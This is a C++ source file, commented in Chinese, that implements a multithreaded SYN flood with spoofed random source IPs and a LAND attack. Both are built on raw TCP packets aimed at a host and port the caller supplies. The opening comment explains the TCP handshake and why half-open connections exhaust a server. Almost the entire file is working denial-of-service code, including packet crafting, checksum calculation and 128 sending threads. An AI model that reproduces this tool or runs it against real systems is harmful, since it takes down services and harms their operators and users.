#include "syn_flood.h"
#include "attack.h"

/*
 * SYN Flood是一种广为人知的DoS（拒绝服务攻击）是DDoS（分布式拒绝服务攻击）的方式之一，
 * 这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式
 *
 * TCP连接的建立说起：
大家都知道，TCP和UDP不同，它提供一种基于连接的，可靠的字节流服务。想要通信的双方，都要首先建立一条TCP连接。这条连接的两端只有通信的双方。TCP连接的建立是这样的：
首先，请求端（发送端）会发一个带有SYN标志位的报文，该报文中含有发送端的初始序号ISN（initinal sequence number)和发送端使用的端口号，该报文就是请求建立连接，
其次，服务器收到这个请求报文后，就会回一个SYN+ACK的报文，同时这个报文中也包含服务器的ISN以及对请求端的确认序号，这个确认序号的值是请求端的序号值+1，表示请求端的请求被接受，
最后，请求端收到这个报文后，就会回应给服务器一个ACK报文，到此一个TCP连接就建立了。

原理
例如，攻击者首先伪造地址对 服务器发起SYN请求（我可以建立连接吗？），服务器就会回应一个ACK+SYN（可以+请确认）。而真实的IP会认为，我没有发送请求，不作回应。服务 器没有收到回应，会重试3-5次并且等待一个SYN Time（一般30秒-2分钟）后，丢弃这个连接。
如果攻击者大量发送这种伪造源地址的 SYN请求，服务器端将会消耗非常多的资源来处理这种半连接，保存遍历会消耗非常多的CPU时间和内存，何况还要不断对这个列表中的IP进行 SYN+ACK的重试。最后的结果是服务器无暇理睬正常的连接请求—拒绝服务。
*/
/* 最多线程数 */
#define MAXCHILD 128

/* 原始套接字 */
int sockfd;

/* 程序活动标志 */
int alive = -1;

char dst_ip[20] = { 0 };
int dst_port;

struct stip{
    unsigned char       hl;
    unsigned char       tos;
    unsigned short      total_len;
    unsigned short      id;
    unsigned short      frag_and_flags;
    unsigned char       ttl;
    unsigned char       proto;
    unsigned short      checksum;
    unsigned int        sourceIP;
    unsigned int        destIP;
};

struct tcphdr{
    unsigned short      sport;
    unsigned short      dport;
    unsigned int        seq;
    unsigned int        ack;
    unsigned char       lenres;
    unsigned char       flag;
    unsigned short      win;
    unsigned short      sum;
    unsigned short      urp;
};

struct pseudohdr
{
    unsigned int	    saddr;
    unsigned int 	    daddr;
    char                zero;
    char                protocol;
    unsigned short      length;
};

/* CRC16校验 */
unsigned short inline
checksum (unsigned short *buffer, unsigned short size)
{

    unsigned long cksum = 0;

    while(size>1){
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }

    if(size){
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return((unsigned short )(~cksum));
}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算

 */
void
init_header(struct stip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
{
    int len = sizeof(struct stip) + sizeof(struct tcphdr);
    // IP头部数据初始化
    ip->hl = (4<<4 | sizeof(struct stip)/sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->frag_and_flags = 0x40;
    ip->ttl = 255;
    ip->proto = IPPROTO_TCP;
    ip->checksum = 0;
    ip->sourceIP = 0;
    ip->destIP = inet_addr(dst_ip);

    // TCP头部数据初始化
    tcp->sport = htons( rand()%16383 + 49152 );
    tcp->dport = htons(dst_port);
    tcp->seq = htonl( rand()%90000000 + 2345 );
    tcp->ack = 0;
    tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
    tcp->flag = 0x02;
    tcp->win = htons (2048);
    tcp->sum = 0;
    tcp->urp = 0;


    //TCP伪头部
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;
    pseudoheader->length = htons(sizeof(struct tcphdr));
    pseudoheader->daddr = inet_addr(dst_ip);
    srand((unsigned) time(NULL));

}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算

 */
void
init_land_header(struct stip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
{
    int len = sizeof(struct stip) + sizeof(struct tcphdr);
    // IP头部数据初始化
    ip->hl = (4<<4 | sizeof(struct stip)/sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->frag_and_flags = 0x40;
    ip->ttl = 255;
    ip->proto = IPPROTO_TCP;
    ip->checksum = 0;
    ip->sourceIP = inet_addr(dst_ip);
    ip->destIP =   inet_addr(dst_ip);

    // TCP头部数据初始化
    tcp->sport = htons(dst_port);
    tcp->dport = htons(dst_port);
    tcp->seq = htonl(0xF1C);//htonl( rand()%90000000 + 2345 );
    tcp->ack = 0;
    tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
    tcp->flag = 0x02;
    tcp->win = htons (2048);
    tcp->sum = 0;
    tcp->urp = 0;


    //TCP伪头部
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;
    pseudoheader->length = htons(sizeof(struct tcphdr));
    pseudoheader->daddr = inet_addr(dst_ip);
    srand((unsigned) time(NULL));

}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 */
void *send_synflood(void *addr)//struct sockaddr_in
{
    char buf[100], sendbuf[100];
    int len;
    struct stip ip;			//IP头部
    struct tcphdr tcp;		//TCP头部
    struct pseudohdr pseudoheader;	//TCP伪头部


    len = sizeof(struct stip) + sizeof(struct tcphdr);

    /* 初始化头部信息 */
    init_header(&ip, &tcp, &pseudoheader);

    /* 处于活动状态时持续发送SYN包 */
    while(alive)
    {
        ip.sourceIP = rand();
//        ip.sourceIP = 1234;

        //计算IP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &ip, sizeof(struct stip));
        ip.checksum = checksum((u_short *) buf, sizeof(struct stip));

        pseudoheader.saddr = ip.sourceIP;

        //计算TCP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &pseudoheader, sizeof(pseudoheader));
        memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
        tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));

        bzero(sendbuf, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(struct stip));
        memcpy(sendbuf+sizeof(struct stip), &tcp, sizeof(struct tcphdr));
        printf(".");
        if (
            sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
            < 0)
        {
            perror("sendto()");
            pthread_exit(0);//"fail");
        }
//        emit attackResult("syn attack...");
//        emit processAttackResult("syn attack...");

//        sleep(1);
    }
}


/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 */
void *send_landattack(void *addr)//struct sockaddr_in
{
    char buf[100], sendbuf[100];
    int len;
    struct stip ip;			//IP头部
    struct tcphdr tcp;		//TCP头部
    struct pseudohdr pseudoheader;	//TCP伪头部


    len = sizeof(struct stip) + sizeof(struct tcphdr);

    /* 初始化头部信息 */
    init_land_header(&ip, &tcp, &pseudoheader);

    /* 处于活动状态时持续发送SYN包 */
    while(alive)
    {
//        ip.sourceIP = rand();

        //计算IP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &ip, sizeof(struct stip));
        ip.checksum = checksum((u_short *) buf, sizeof(struct stip));

        pseudoheader.saddr = ip.sourceIP;
        pseudoheader.daddr = ip.sourceIP;

        //计算TCP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &pseudoheader, sizeof(pseudoheader));
        memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
        tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));

        bzero(sendbuf, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(struct stip));
        memcpy(sendbuf+sizeof(struct stip), &tcp, sizeof(struct tcphdr));
        printf(".");
        if (
            sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
            < 0)
        {
            perror("sendto()");
            pthread_exit(0);//"fail");
        }
//        emit attackResult("syn attack...");
//        emit processAttackResult("syn attack...");

//        sleep(1);
    }
}
/* 信号处理函数,设置退出变量alive */
void sig_int(int signo)//
{
    alive = signo;//0;
}

void syn_flood::set_sig_int()//
{
    alive = 0;
    printf("pthread exit!,线程退出！\n");

}

syn_flood::syn_flood()
{

}

/* 主函数 */
int syn_flood::do_main(char *strip,int port)
{
    struct sockaddr_in addr;
    struct hostent * host = NULL;

    int on = 1;
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive = 1;
    /* 截取信号CTRL+C */
    signal(SIGINT, sig_int);

    strncpy( dst_ip, strip, 16 );
    dst_port = port;//atoi( argv[2] );

    bzero(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dst_port);

    if(inet_addr(dst_ip) == INADDR_NONE)
    {
        /* 为DNS地址，查询并转换成IP地址 */
        host = gethostbyname(strip);
        if(host == NULL)
        {
            perror("gethostbyname()");
            exit(1);
        }
        addr.sin_addr = *((struct in_addr*)(host->h_addr));
        strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
    }
    else
        addr.sin_addr.s_addr = inet_addr(dst_ip);

    if( dst_port < 0 || dst_port > 65535 )
    {
        printf("Port Error\n");
        exit(1);
    }

    printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

    /* 建立原始socket */
    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
    {
        perror("socket()");
        exit(1);
    }
    /* 设置IP选项 */
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
    {
        perror("setsockopt()");
        exit(1);
    }

    /* 将程序的权限修改为普通用户 */
//    setuid(getpid());

    /* 建立多个线程协同工作 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
        if(err != 0)
        {
            perror("pthread_create()");
            exit(1);
        }
        //sleep(1);
        //break;//test
    }

    /* 等待线程结束 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_join(pthread[i], NULL);
        if(err != 0)
        {
            perror("pthread_join Error\n");
            exit(1);
        }
    }

    close(sockfd);

    return 0;
}


/* 主函数 */
int syn_flood::do_land(char *strip,int port)
{
    struct sockaddr_in addr;
    struct hostent * host = NULL;

    int on = 1;
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive = 1;
    /* 截取信号CTRL+C */
    signal(SIGINT, sig_int);

    strncpy( dst_ip, strip, 16 );
    dst_port = port;//atoi( argv[2] );

    bzero(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dst_port);

    if(inet_addr(dst_ip) == INADDR_NONE)
    {
        /* 为DNS地址，查询并转换成IP地址 */
        host = gethostbyname(strip);
        if(host == NULL)
        {
            perror("gethostbyname()");
            exit(1);
        }
        addr.sin_addr = *((struct in_addr*)(host->h_addr));
        strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
    }
    else
        addr.sin_addr.s_addr = inet_addr(dst_ip);

    if( dst_port < 0 || dst_port > 65535 )
    {
        printf("Port Error\n");
        exit(1);
    }

    printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

    /* 建立原始socket */
    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
    {
        perror("socket()");
        exit(1);
    }
    /* 设置IP选项 */
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
    {
        perror("setsockopt()");
        exit(1);
    }

    /* 将程序的权限修改为普通用户 */
//    setuid(getpid());

    /* 建立多个线程协同工作 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, send_landattack, &addr);
        if(err != 0)
        {
            perror("pthread_create()");
            exit(1);
        }
        //sleep(1);
        //break;//test
    }

    /* 等待线程结束 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_join(pthread[i], NULL);
        if(err != 0)
        {
            perror("pthread_join Error\n");
            exit(1);
        }
    }

    close(sockfd);

    return 0;
}
